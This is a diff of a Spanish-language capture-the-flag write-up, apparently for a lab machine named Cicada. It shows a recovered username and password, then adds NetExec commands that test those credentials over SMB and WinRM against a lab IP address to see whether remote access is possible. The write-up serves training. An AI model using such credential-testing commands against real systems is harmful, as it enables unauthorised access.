@@ -146,7 +146,13 @@ Obtemos las siguientes credenciales
 michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
 ```
 
+Verificamos que el usuario es valido
+`nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 
+Verificamos tambien si pertenece al grupo de remote users management
+`nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
+
+En caso de que pertenezca a este apareceria el `pwned`
 
 
 
